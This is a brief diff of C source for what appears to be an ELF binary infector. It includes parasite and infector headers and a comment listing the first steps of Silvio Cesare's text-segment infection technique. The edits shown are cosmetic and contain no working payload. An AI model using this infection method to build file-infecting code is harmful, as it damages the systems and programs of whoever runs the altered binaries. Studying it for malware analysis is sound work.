@@ -1,5 +1,3 @@
-/* oblique 2010
- */
 #include <stdio.h>
 #include <stdlib.h>
 #include <inttypes.h>
@@ -8,6 +6,7 @@
 #include <sys/user.h>
 #include <elf.h>
 #include <errno.h>
+
 #include "common.h"
 #include "infector.h"
 #include "parasite.h"
@@ -30,7 +29,6 @@
 #define infect_elf BITS(infect_elf)
 #define parasite BITS(parasite)
 #define init_parasite BITS(init_parasite)
-
 
 #define __FATAL(name) do { \
     print_error(__FILE__, __LINE__-1, errno, name); \
@@ -72,6 +70,8 @@ int check_elf(Elf_Ehdr *ehdr) {
 
 
 /* Silvio's algorithm:
+ *              sesstion header, segment header, offset
+ *
     * Increase e_shoff by PAGE_SIZE in the ELF header
     * Patch the insertion code (parasite) to jump to the entry point (original)
     * Locate the text segment program header
